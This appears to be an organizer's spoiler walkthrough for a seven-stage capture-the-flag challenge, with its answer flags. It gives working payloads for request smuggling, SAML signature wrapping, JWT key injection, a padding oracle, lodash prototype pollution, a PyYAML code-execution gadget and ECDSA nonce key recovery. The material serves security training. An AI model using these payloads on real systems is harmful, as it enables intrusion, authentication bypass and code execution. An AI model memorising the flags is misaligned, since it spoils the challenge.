# Solution walkthrough (organizer — SPOILERS)

`scripts/solve.py` performs this entire chain automatically (and is the source of
truth for exact payloads); `scripts/hnp_solve.py` is the standalone stage-7
attack. Everything after stage 2 goes through the edge gateway with the
`kh_corp` cookie.

---

## Stage 1 — CVE-2019-18277 : TE/CL request smuggling → FLAG 1

The edge frames a body by the FIRST `Transfer-Encoding` header only if it is
exactly `chunked` (else Content-Length), and blocks `/internal`. The SSO backend
frames as chunked if ANY TE contains `chunked`. Send two TE headers so the edge
uses Content-Length (ACL-checking only the outer request) while the backend reads
it as chunked, parsing a smuggled request to `/internal`:

```
POST /login HTTP/1.1
Host: app.keyhaven.example
Content-Length: <len of body>
Transfer-Encoding: cow
Transfer-Encoding: chunked

0

GET /internal/bootstrap HTTP/1.1
Host: sso

```
The second response holds **`KH{t3_cl_d3sync_smuggl3d_past_th3_edg3_acl}`** and
points at the SAML ACS.

---

## Stage 2 — CVE-2018-0489 : SAML signature wrapping → FLAG 2 (+ gateway cookie)

Smuggle `GET /internal/saml/sample` for a validly-signed **guest** assertion. The
SP validates the signature by its Reference URI (correct) but reads the subject
from the **first** `<Assertion>` by position. Prepend an unsigned **admin**
assertion as the first child of `<Response>`, keep the signed guest assertion
second, re-encode, and smuggle it to `/internal/saml/acs`:

```
<samlp:Response ...>
  <saml:Assertion ID="_evil">               <!-- attacker, unsigned, position 0 -->
    <saml:Subject><saml:NameID>admin@keyhaven.example</saml:NameID></saml:Subject>
    <saml:AttributeStatement><saml:Attribute Name="role">
      <saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute></saml:AttributeStatement>
  </saml:Assertion>
  <saml:Assertion ID="_assert_guest_7f3c"> ...signed guest assertion (untouched)... </saml:Assertion>
</samlp:Response>
```
→ **`KH{saml_xsw_s1gn3d_0n3_assert10n_tru5t3d_an0th3r}`** and
`Set-Cookie: kh_corp=...`. The edge now proxies `/gw/api`, `/gw/vault`,
`/gw/signer` for requests carrying that cookie. (Tampering the *signed* assertion
instead fails with a digest mismatch.)

---

## Stage 3 — CVE-2018-0114 : node-jose `jwk` injection → FLAG 3

The API verifies JWTs using the key embedded in the token's own header. Generate
your own EC key, put its public JWK in the header, set `scope:admin`, sign with
your private key, and present it:

```bash
# header = {"alg":"ES256","jwk":<your public jwk>} ; payload = {"scope":"admin"}
curl -H "Cookie: kh_corp=$C" -H "Authorization: Bearer $FORGED" http://app.keyhaven.example/gw/api/admin
```
→ **`KH{n0de_j0se_jwk_h3ad3r_1nj3ct10n_s3lf_s1gn3d}`** (a genuine guest token is
403'd — only the forged, attacker-keyed token passes).

---

## Stage 4 — CVE-2016-2107 : CBC padding oracle → FLAG 4

`GET /gw/api/capability/sealed` returns `base64(IV||ciphertext)`.
`POST /gw/api/capability/open {token}` returns **distinguishable** errors —
`invalid padding` vs `invalid mac` — never the plaintext. `invalid mac` means the
padding was valid: a classic byte-by-byte CBC padding oracle recovers the sealed
plaintext. → **`KH{cbc_padd1ng_0racl3_mac_vs_pad_d1st1ngu1sh}`**

---

## Stage 5 — CVE-2019-10744 : lodash prototype pollution → FLAG 5

`POST /gw/api/config/update` runs `_.defaultsDeep(config, body)`. Pollute the
prototype so a server default flips on:

```bash
curl -H "Cookie: kh_corp=$C" -H 'Content-Type: application/json' \
  -d '{"constructor":{"prototype":{"yamlImportEnabled":true}}}' http://app.keyhaven.example/gw/api/config/update
curl -H "Cookie: kh_corp=$C" http://app.keyhaven.example/gw/api/admin/features
```
→ **`KH{l0dash_def4ultsd33p_pr0t0typ3_p0llut10n}`** and the YAML importer is now enabled.

---

## Stage 6 — CVE-2020-14343 : PyYAML full_load RCE → FLAG 6

The enabled `/gw/api/config/import` forwards YAML to the vault's `yaml.full_load`.
A FullLoader-bypass gadget runs code (note the space before `}`):

```yaml
!!python/object/new:type
args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
listitems: "import os; open('/tmp/yaml_out','w').write(os.popen('cat /opt/vault/FLAG6.txt').read())"
```
→ **`KH{pyyaml_full_l0ad_typ3_ext3nd_3x3c_byp4ss}`** (and the vault names the signer).

---

## Stage 7 — CVE-2024-31497 : biased-nonce ECDSA → HNP lattice → FINAL FLAG

Every `/gw/signer/sign` uses a nonce with its top 64 bits forced to zero. With
`k_i = s_i^{-1}(z_i + r_i d) = a_i + t_i d (mod n)` and `0 <= k_i < 2^{192}`,
collect ~8 signatures, build the Hidden Number Problem lattice, LLL-reduce,
recover `d`, sign the challenge `/pubkey` advertises, and submit it:

```bash
python3 scripts/hnp_solve.py http://localhost:8080/gw/signer   # (with the cookie)
```
→ **`KH{putty_b1as3d_n0nce_hnp_latt1ce_k3y_r3c0v3ry}`** — the master signing key
is compromised. `/sign` refuses `root`/challenge messages, so the key must be
recovered, not borrowed.

---

## Bonus — CVE-2022-21449 : Psychic Signatures

`/gw/signer/verify-manifest` omits the `0 < r,s < n` range check:

```bash
curl -H "Cookie: kh_corp=$C" -H 'Content-Type: application/json' \
  -d '{"r":0,"s":0}' http://app.keyhaven.example/gw/signer/verify-manifest
```
→ **`KH{ecdsa_psych1c_s1gnatur3_z3r0_z3r0_4ccept3d}`**
